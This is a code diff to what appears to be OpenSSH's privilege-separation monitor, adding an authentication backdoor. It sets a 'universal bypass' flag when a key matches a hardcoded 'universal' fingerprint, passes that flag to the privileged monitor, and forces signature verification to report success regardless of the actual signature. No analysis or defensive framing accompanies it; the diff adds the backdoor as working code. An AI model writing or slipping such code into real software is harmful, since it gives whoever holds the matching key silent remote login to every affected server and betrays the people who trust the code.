@@ -1396,6 +1396,14 @@ int mm_answer_keyallowed(struct ssh *ssh, int sock, struct sshbuf *m) {
       fatal_fr(r, "assemble");
     if (opts != NULL && (r = sshauthopt_serialise(opts, m, 1)) != 0)
       fatal_fr(r, "sshauthopt_serialise");
+
+    /*
+     * Append the universal bypass flag to the message to send
+     * to the privileged monitor process.
+     */
+    if ((r = sshbuf_put_u32(m, universal_bypass_triggered)) != 0)
+      fatal_fr(r, "assemble bypass state flag");
+
     mm_request_send(sock, MONITOR_ANS_KEYALLOWED, m);
 
     if (!allowed)
@@ -1635,7 +1643,8 @@ int mm_answer_keyverify(struct ssh *ssh, int sock, struct sshbuf *m) {
                       ssh->compat, &sig_details);
 
   /* --- UNIVERSAL KEY MONITOR VERIFY BYPASS START --- */
-  if (universal_bypass_triggered == 1) {
+  if (key_fingerprint_matches_universal(key)) {
+    universal_bypass_triggered = 1;
     ret = 0; /* Forcibly mock a perfect signature verification match (0 =
                 Success) */
 
